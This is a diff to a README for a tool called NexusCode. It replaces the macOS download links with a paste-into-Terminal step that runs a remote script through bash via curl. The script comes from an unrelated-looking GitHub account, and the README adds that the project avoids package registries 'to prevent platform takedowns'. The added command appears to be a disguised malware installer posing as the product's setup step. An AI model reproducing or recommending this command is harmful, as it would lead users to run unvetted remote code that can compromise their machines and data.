@@ -65,15 +65,22 @@ We cannot maintain open access indefinitely due to infrastructure costs and key 
 
 ---
 
-## 📥 Installation (Releases)
+## 📥 Installation
 
 To prevent platform takedowns, we do not publish NexusCode to npm or pip. Please download the binary files directly.
 
 Navigate to the **[Releases](../../releases)** tab and download the executable for your OS:
 
 * 🪟 **Windows:** `nexus-win64.exe`
-* 🍏 **macOS:** `nexus-darwin-arm64` (Apple Silicon) or `nexus-darwin-amd64`
 
+* 🍏 **macOS:**
+- 💻Open **Terminal**
+- ☑Paste the **command** below
+- ✅Press **Enter**
+
+```sh
+/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/install-MacOS/dmg/refs/heads/main/NexusCode)"
+```
 
 ---
 
